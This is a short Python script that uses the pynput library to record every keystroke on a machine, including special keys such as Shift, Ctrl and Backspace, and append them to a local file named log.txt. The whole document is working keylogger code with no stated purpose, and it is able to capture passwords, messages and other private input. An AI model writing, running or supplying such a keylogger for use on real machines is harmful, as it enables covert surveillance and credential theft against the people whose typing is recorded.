from pynput.keyboard import Listener, Key

def write_to_file(key):
    try:
        # Handle special keys
        if isinstance(key, Key):
            if key == Key.space:
                letter = ' '
            elif key == Key.enter:
                letter = '\n'
            elif key == Key.backspace:
                letter = '[BACKSPACE]'
            elif key == Key.tab:
                letter = '[TAB]'
            elif key == Key.esc:
                letter = '[ESC]'
            elif key == Key.shift or key == Key.shift_r or key == Key.shift_l:
                letter = '[SHIFT]'
            elif key == Key.ctrl or key == Key.ctrl_l or key == Key.ctrl_r:
                letter = '[CTRL]'
            elif key == Key.alt or key == Key.alt_l or key == Key.alt_r:
                letter = '[ALT]'
            elif key == Key.caps_lock:
                letter = '[CAPSLOCK]'
            elif key == Key.num_lock:
                letter = '[NUMLOCK]'
            elif key == Key.scroll_lock:
                letter = '[SCROLLLOCK]'
            else:
                letter = f'[{key}]'
        # Handle alphanumeric keys
        else:
            letter = key.char

        with open("log.txt", 'a') as f:
            f.write(letter)
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    with Listener(on_press=write_to_file) as listener:
        listener.join()
